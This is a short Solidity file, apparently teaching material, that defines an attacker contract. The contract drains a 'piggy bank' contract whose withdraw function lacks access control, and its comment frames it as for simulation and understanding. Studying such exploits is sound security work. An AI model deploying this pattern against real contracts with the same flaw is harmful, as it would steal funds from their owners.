// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
//This is a basic attack contract (for simulation/understanding). It exploits the vulnerability in the original contract where anyone could withdraw.
interface IVulnerablePiggyBank {
    function withdraw() external;
}

contract Attacker {
    IVulnerablePiggyBank public piggy;

    constructor(address _piggyAddress) {
        piggy = IVulnerablePiggyBank(_piggyAddress);
    }

    // Attack function that exploits the lack of access control
    function attack() public {
        piggy.withdraw();
    }

    // Allow contract to receive Ether
    receive() external payable {}
}
